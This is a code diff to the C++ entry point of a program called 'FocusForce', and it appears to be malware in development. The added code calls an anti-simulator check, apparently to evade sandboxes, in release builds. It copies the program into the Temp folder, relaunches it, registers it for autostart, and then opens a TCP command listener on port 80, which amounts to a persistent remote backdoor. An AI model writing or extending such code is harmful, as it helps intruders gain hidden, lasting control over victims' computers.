@@ -1,5 +1,6 @@
 #include <iostream>
 #include <string>
+#include "CommandServer.h"
 #include "AutostartMenager.h"
 #include <cstdlib>
 
@@ -23,17 +24,26 @@ int main(int argc, char** argv) {
     cout<<argv[0] << "\n";
     cout<<"FocusForce init...\n";
     #ifndef DEBUG
-    antySimulator();
+        antySimulator();
+        cout<<"Autostart status: " << autostartMenager.isInStartup() << "\n";
+        if(autostartMenager.isInTempFolder(string(argv[0]))==false){
+            cout<<"No in Temp!\n";
+            string filePath = autostartMenager.moveToTempFolder();
+            string commadToRun = "start " + filePath;
+            system(commadToRun.c_str());
+
+            if(!autostartMenager.isInStartup()){
+                cout << "Adding to register...\n";
+                autostartMenager.addToStartup(filePath);
+            }
+            return 0;
+        }
+        cout << "in Temp!\n";
     #endif
 
-    if(autostartMenager.isInTempFolder(string(argv[0]))==false){
-        cout<<"No in Temp!\n";
-        string commadToRun = "start " + autostartMenager.moveToTempFolder();
-        system(commadToRun.c_str());
-        return 0;
-    }
-    cout << "in Temp!\n";
-    int a;
-    cin>>a;
+    CommandServer c;
+    c.startTCPListener(80);
+
+
     return 0;
 } 
